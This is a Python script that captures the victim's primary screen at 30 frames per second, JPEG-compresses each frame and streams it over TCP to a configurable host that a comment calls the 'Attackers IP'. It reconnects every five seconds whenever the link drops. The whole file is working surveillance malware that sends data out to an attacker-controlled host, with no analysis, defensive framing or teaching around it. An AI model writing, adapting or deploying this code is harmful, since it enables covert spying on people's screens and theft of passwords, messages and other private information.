import socket
import struct
import io
import mss
from PIL import Image
import time
import sys

# --- Configuration ---
SERVER_HOST = '192.168.1.102' # Change this to Attackers IP
SERVER_PORT = 1234       
JPEG_QUALITY = 80          
FPS = 30                   
RETRY_INTERVAL = 5         # Seconds to wait before retrying connection

# --- Global Variables ---
client_socket = None
is_running = True

def send_screen():
    """
    Captures the screen, compresses it, and sends it to the server.
    This function continuously runs in a loop.
    """
    global is_running
    try:
        with mss.mss() as sct:
            # Get information of monitor 1 (primary monitor)
            # You can change this if you have multiple monitors
            monitor = sct.monitors[1]

            while is_running:
                start_time = time.time()

                # 1. Capture the screen
                sct_img = sct.grab(monitor)

                # 2. Convert mss image to PIL Image
                # mss.grab returns a dict-like object with 'rgb' bytes and 'size' tuple
                img = Image.frombytes("RGB", sct_img.size, sct_img.rgb)

                # 3. Compress the image to JPEG bytes
                img_byte_arr = io.BytesIO()
                img.save(img_byte_arr, format='JPEG', quality=JPEG_QUALITY)
                image_data = img_byte_arr.getvalue()

                # 4. Send the size of the image data (4 bytes, unsigned long)
                # This tells the server how many bytes to expect for the image
                client_socket.sendall(struct.pack('<L', len(image_data)))

                # 5. Send the actual image data
                client_socket.sendall(image_data)

                # Control frame rate
                elapsed_time = time.time() - start_time
                if elapsed_time < (1 / FPS):
                    time.sleep((1 / FPS) - elapsed_time)

    except (socket.error, ConnectionResetError) as e:
        print(f"Connection lost or error during data transfer: {e}")
        print("Attempting to reconnect...")
        # If connection is lost during send_screen, we break this loop
        # and the outer start_client loop will handle reconnection.
    except mss.exception.ScreenShotError as e:
        print(f"Screen capture error: {e}")
        print("Please ensure you have necessary permissions for screen recording.")
        is_running = False # Stop trying to send if screen capture fails
    except Exception as e:
        print(f"An unexpected error occurred in send_screen: {e}")
        is_running = False # Stop on unexpected errors
    finally:
        # This finally block will be executed if the loop in send_screen exits
        # either due to an error or `is_running` becoming False.
        # We don't call close_client here directly, as start_client will handle it
        # or attempt a re-connection.
        pass

def close_client():
    """Closes the client socket and shuts down the client."""
    global is_running, client_socket
    is_running = False
    print("Shutting down client...")
    if client_socket:
        try:
            client_socket.shutdown(socket.SHUT_RDWR)
            client_socket.close()
            print("Client socket closed.")
        except OSError as e:
            print(f"Error closing client socket: {e}")
    sys.exit(0) # Exit the script cleanly

def start_client():
    """Initializes the client socket and connects to the server, with retry logic."""
    global client_socket, is_running

    while True: # Continuous retry loop
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            print(f"Attempting to connect to {SERVER_HOST}:{SERVER_PORT}...")
            client_socket.connect((SERVER_HOST, SERVER_PORT))
            print("Connected to server.")
            is_running = True # Reset is_running to True on successful connection
            send_screen() # Start sending screens once connected
            # If send_screen returns, it means the connection was lost or an error occurred.
            # The loop will then go for a retry.

        except ConnectionRefusedError:
            print(f"Connection refused by {SERVER_HOST}:{SERVER_PORT}. Retrying in {RETRY_INTERVAL} seconds...")
        except socket.timeout:
            print(f"Connection attempt timed out to {SERVER_HOST}:{SERVER_PORT}. Retrying in {RETRY_INTERVAL} seconds...")
        except socket.error as e:
            print(f"Socket error during connection: {e}. Retrying in {RETRY_INTERVAL} seconds...")
        except Exception as e:
            print(f"An unexpected error occurred during client startup: {e}. Retrying in {RETRY_INTERVAL} seconds...")
        finally:
            # Always close the socket if it was created, before retrying
            if client_socket:
                try:
                    client_socket.close()
                except OSError as e:
                    print(f"Error closing socket before retry: {e}")
            time.sleep(RETRY_INTERVAL) # Wait before the next connection attempt

if __name__ == "__main__":
    start_client()